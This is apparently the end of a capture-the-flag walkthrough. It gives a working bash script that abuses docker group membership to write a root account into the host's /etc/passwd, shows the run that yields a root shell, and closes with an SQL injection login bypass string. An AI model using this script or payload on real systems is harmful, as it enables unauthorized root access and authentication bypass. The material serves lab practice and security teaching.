docker_test=$( docker ps | grep "CONTAINER ID" | cut -d " " -f 1-2 )

if [ $(id -u) -eq 0 ]; then
    echo "The user islready root. Have fun ;-)"
    exit

elif [ "$docker_test" == "CONTAINER ID" ]; then
    echo 'Please write down your new root credentials.'
    read -p 'Choose a root user name: ' rootname
    read -s -p 'Choose a root password: ' passw
    hpass=$(openssl passwd -1 -salt mysalt $passw)

    echo -e "$rootname:$hpass:0:0:root:/root:/bin/bash" > new_account
    mv new_account /tmp/new_account
    docker run -tid -v /:/mnt/ --name flast101.github.io alpine # CHANGE THIS IF NEEDED
    docker exec -ti flast101.github.io sh -c "cat /mnt/tmp/new_account >> /mnt/etc/passwd"
    sleep 1; echo '...'

    echo 'Success! Root user ready. Enter your password to login as root:'
    docker rm -f flast101.github.io
    docker image rm alpine
    rm /tmp/new_account
    su $rootname

else echo "Your account does not have permission to execute docker or docker is not running, aborting..."
    exit

fi



```

Let's run that script:


```
anurodh@ubuntu:~$ ./docker.sh
Please write down your new root credentials.
Choose a root user name: sugo
Choose a root password: 4ac801b38b230418fbb1f43790796587d6e9565c9928ce3d4dbe446736885abf
...
Success! Root user ready. Enter your password to login as root:
flast101.github.io
Untagged: alpine:latest
Untagged: alpine@sha256:185518070891758909c9f839cf4ca393ee977ac378609f700f60a771a2dfe321
Deleted: sha256:a24bb4013296f61e89ba57005a7b3e52274d8edd3ae2077d04395f806b63d83e
Deleted: sha256:50644c29ef5a27c9a40c393a73ece2479de78325cae7d762ef3cdc19bf42dd0a
Password:
root@ubuntu:/home/anurodh# id
uid=0(root) gid=0(root) groups=0(root)
root@ubuntu:/home/anurodh# cd
root@ubuntu:~# ls
proof.txt
```

We got root and we are able to grab proof.txt file!


#### Notes

Login form is actually vulnerable to SQLi, so you can bypass it with very basic injection like 


```' or 1=1-- -```




